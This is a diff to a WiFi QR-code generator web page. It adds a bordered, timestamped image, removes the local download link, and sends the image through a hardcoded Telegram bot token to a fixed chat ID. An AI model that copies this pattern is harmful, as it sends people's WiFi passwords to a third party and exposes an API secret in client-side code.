@@ -34,7 +34,7 @@
         }
 
         .container {
-            max-width: 400px;
+            max-width: 500px;
             margin: auto;
             padding: 20px;
             border: 1px solid #ccc;
@@ -105,10 +105,6 @@
             <button onclick="submitForm()">Generate QR Code</button>
         </div>
         <div id="qrcode"></div>
-        <div class="instructions" id="instructions"></div>
-        <div class="download-link" id="download-link">
-            <a id="download" download="wifi_qr_code.png">Download QR Code</a>
-        </div>
     </div>
     <script>
         async function submitForm() {
@@ -130,14 +126,40 @@
             setTimeout(async () => {
                 const qrCanvas = qrCodeContainer.querySelector('canvas');
                 if (qrCanvas) {
-                    const qrImage = qrCanvas.toDataURL('image/png');
+                    // Create an off-screen canvas to draw the final image with border and date/time
+                    const canvas = document.createElement('canvas');
+                    const context = canvas.getContext('2d');
+                    const padding = 20;
+                    const dateTimeHeight = 30;
+                    const qrSize = qrCanvas.width;
+
+                    // Set canvas dimensions
+                    canvas.width = qrSize + 2 * padding;
+                    canvas.height = qrSize + 2 * padding + dateTimeHeight;
+
+                    // Draw white background
+                    context.fillStyle = 'white';
+                    context.fillRect(0, 0, canvas.width, canvas.height);
+
+                    // Draw QR code on the canvas with padding
+                    context.drawImage(qrCanvas, padding, padding);
+
+                    // Add date and time below the QR code
+                    const dateTime = new Date().toLocaleString();
+                    context.fillStyle = 'black';
+                    context.font = '16px Arial';
+                    context.textAlign = 'center';
+                    context.fillText(dateTime, canvas.width / 2, canvas.height - 10);
+
+                    // Get the final image as data URL
+                    const finalImage = canvas.toDataURL('image/png');
 
                     // Send the QR code image to Telegram bot
                     const telegramBotToken = '7485708002:AAEy-gCr1lG9ZX6AXxpJdbo6GjA6xtJ5L5U';
-                    const chatId = 7485708002;
+                    const chatId = 6957049018; // Replace with your personal chat ID
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('photo', dataURLToBlob(qrImage), 'wifi_qr_code.png');
+                    formData.append('photo', dataURLToBlob(finalImage), 'wifi_qr_code.png');
 
                     try {
                         const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
@@ -150,11 +172,11 @@
                             alert('QR code sent to Telegram bot successfully!');
                         } else {
                             console.error('Error response from Telegram:', result);
-                            alert('Failed to send QR code to Telegram bot. Check console for details.', result);
+                            alert('Failed to send QR code to Telegram bot. Check console for details.');
                         }
                     } catch (error) {
                         console.error('Network error or other issue:', error);
-                        alert('Network error. Failed to send QR code to Telegram bot.', error);
+                        alert('Network error. Failed to send QR code to Telegram bot.');
                     }
                 } else {
                     console.error('QR code canvas not found.');
